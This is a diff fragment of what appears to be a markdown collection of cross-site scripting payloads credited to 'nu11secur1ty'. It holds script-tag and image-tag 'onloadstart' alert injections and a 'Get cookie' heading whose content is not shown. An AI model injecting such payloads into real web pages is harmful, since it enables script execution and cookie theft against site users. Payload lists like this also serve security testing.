@@ -17,8 +17,6 @@ qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ## ExistantImage
 ```
 <div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
-<div><image src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif onloadstart=alert(1337)>hello from nu11secur1ty</div>
-
 ```
 ## Get cookie
 ```
